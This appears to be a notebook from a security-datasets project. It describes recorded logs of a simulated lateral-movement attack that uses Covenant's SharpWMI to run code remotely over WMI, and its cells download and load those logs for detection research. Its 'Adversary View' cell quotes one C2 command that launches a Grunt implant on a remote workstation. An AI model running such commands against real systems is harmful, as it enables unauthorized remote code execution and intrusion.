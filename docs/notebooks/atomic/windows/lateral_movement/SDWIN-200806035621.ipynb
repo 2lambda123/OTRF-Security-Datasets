{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "1c6acac3",
   "metadata": {},
   "source": [
    "# Covenant SharpWMI Exec"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "17e30883",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b829cf42",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0002](https://attack.mitre.org/tactics/TA0002),[TA0008](https://attack.mitre.org/tactics/TA0008) |\n",
    "| Techniques        | [T1047](https://attack.mitre.org/techniques/T1047) |\n",
    "| Tags              | WMI IWbemServices ExecMethod |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dd2a68ae",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents an adversary remotely executing code via WMI. This dataset focuses on the use of the WMI Win32_Process class and method Create to execute code remotely."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0aed53e2",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4eddcd01",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_sharpwmi_create_dcerpc_wmi.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_sharpwmi_create_dcerpc_wmi.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_sharpwmi_create_dcerpc_wmi.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_sharpwmi_create_dcerpc_wmi.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fd933e32",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cc7a375a",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3764f4c8",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Covenant | [SharpWMI](https://github.com/GhostPack/SharpWMI) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c8277575",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(wardog) > SharpWMI /command:\"action=exec computername=WORKSTATION6 command=\\\"C:\\\\Windows\\\\System32\\\\GruntHTTP2.exe\\\"\"\n",
    "\n",
    "[*] Host                           : WORKSTATION6\n",
    "\n",
    "[*] Command                        : \"C:\\\\Windows\\\\System32\\\\GruntHTTP2.exe\"\n",
    "\n",
    "[*] Creation of process returned   : 0\n",
    "\n",
    "[*] Process ID                     : 3824\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "11645102",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d9d7e0f2",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ded3f216",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_sharpwmi_create_dcerpc_wmi.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1d1da767",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "054bf611",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b18f69e2",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5eb28370",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d45b9026",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/](https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
